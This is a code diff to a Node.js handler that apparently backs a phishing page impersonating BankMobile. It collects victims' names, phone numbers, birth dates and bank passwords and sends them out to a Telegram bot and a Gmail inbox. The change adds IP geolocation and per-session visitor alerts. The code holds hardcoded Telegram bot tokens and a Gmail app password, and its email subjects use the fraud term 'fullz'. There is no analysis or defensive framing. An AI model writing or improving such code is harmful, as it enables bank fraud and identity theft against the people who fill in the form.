@@ -6,6 +6,11 @@ module.exports = async (req, res) => {
     return res.status(405).json({ error: "Method Not Allowed" });
   }
 
+  // ✅ Check if session is available
+  if (!req.session) {
+    return res.status(500).json({ error: "Session is not available" });
+  }
+
   const {
     fullName,
     phoneNumber,
@@ -20,50 +25,66 @@ module.exports = async (req, res) => {
     dob,
   } = req.body || {};
 
-  // Capture IP + time
-  const visitorIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-  const timestamp = new Date().toLocaleString();
+  // Get visitor IP and time
+  const rawIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  const visitorIP = rawIP?.split(",")[0]?.trim();
 
-  const botToken = "7597626302:AAFxp2Q5hTEVaCGlt4pauCnVitgZXzNH7dw";
-  const chatId = "1775129269";
+  let locationInfo = "Unknown Location";
+  try {
+    const geoRes = await axios.get(`https://ipapi.co/${visitorIP}/json/`);
+    const { city, region, country_name } = geoRes.data;
+    locationInfo = `${city || "?"}, ${region || "?"}, ${country_name || "?"}`;
+  } catch (geoErr) {
+    console.warn("🌐 IP lookup failed:", geoErr.message);
+  }
 
-  // Email transporter config
+  const timestamp = new Date().toLocaleString("en-US", {
+    timeZone: "America/New_York",
+    hour12: true,
+  });
+
+  const botToken = "8197614628:AAF5CDk0BWe4sE3MuKDjbPMIWfqiIurDYKo";
+  const chatId = "5943926384";
+
   const transporter = nodemailer.createTransport({
     service: "Gmail",
     auth: {
-      user: "recruitmentupdate9@gmail.com",       // ✅ Your Gmail
-      pass: "ghtb ltut ihbk ghor",          // ✅ App Password
+      user: "recruitmentupdate9@gmail.com",
+      pass: "ghtb ltut ihbk ghor",
     },
   });
 
-  // Build visitor tracking message
-  const visitorMessage = `
+  // ✅ Send visitor alert only once per session
+  if (!req.session.visitorAlertSent) {
+    const visitorMessage = `
 👀 *New Visitor Landed on the Form Page*
+
 🌐 IP: ${visitorIP}
+📍 Location: ${locationInfo}
 🕒 Time: ${timestamp}
-  `;
+`;
 
-  try {
-    // Send visitor tracking to Telegram
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      chat_id: chatId,
-      text: visitorMessage,
-      parse_mode: "Markdown",
-    });
+    try {
+      await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        chat_id: chatId,
+        text: visitorMessage,
+        parse_mode: "Markdown",
+      });
 
-    // Send visitor tracking to Email
-    await transporter.sendMail({
-      from: '"BankMobile" <workingfullz@gmail.com>',
-      to: "recruitmentupdate9@gmail.com",
-      subject: "👀 New Visitor on the Page",
-      text: `A visitor landed on your form page:\n\nIP: ${visitorIP}\nTime: ${timestamp}`,
-    });
-  } catch (visitorError) {
-    console.error("Visitor tracking failed:", visitorError.message);
-    // Don't return yet — continue to handle form
+      await transporter.sendMail({
+        from: '"BankMobile" <workingfullz@gmail.com>',
+        to: "recruitmentupdate9@gmail.com",
+        subject: "👀 New Visitor BankMobile",
+        text: `New visitor BankMobile:\n\nIP: ${visitorIP}\nLocation: ${locationInfo}\nTime: ${timestamp}`,
+      });
+
+      req.session.visitorAlertSent = true;
+    } catch (err) {
+      console.error("Visitor alert failed:", err.message);
+    }
   }
 
-  // If it's just a visit with no form submission — return success now
+  // If no form submission, return after tracking visit
   if (
     !fullName &&
     !phoneNumber &&
@@ -77,7 +98,7 @@ module.exports = async (req, res) => {
     return res.status(200).json({ message: "Visitor tracked" });
   }
 
-  // Validate form submission
+  // Validate form
   if (
     !fullName ||
     !phoneNumber ||
@@ -93,7 +114,7 @@ module.exports = async (req, res) => {
   }
 
   const message = `
-📩 *New Form Submission*
+📩 *New BankMobile Details*
 
 👤 Full Name: ${fullName}
 📱 Phone Number: ${phoneNumber}
@@ -114,22 +135,21 @@ module.exports = async (req, res) => {
 🔑 Password: ${bankMobilePassword || "N/A"}
 
 🌐 Visitor IP: ${visitorIP}
+📍 Location: ${locationInfo}
 🕒 Time: ${timestamp}
 `;
 
   try {
-    // Send form message to Telegram
     await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
       text: message,
       parse_mode: "Markdown",
     });
 
-    // Send form to email
     await transporter.sendMail({
       from: '"BankMobile" <workingfullz@gmail.com>',
       to: "recruitmentupdate9@gmail.com",
-      subject: "📩 BankMobile Fullz",
+      subject: "📩 New BankMobile Details",
       text: message,
     });
 
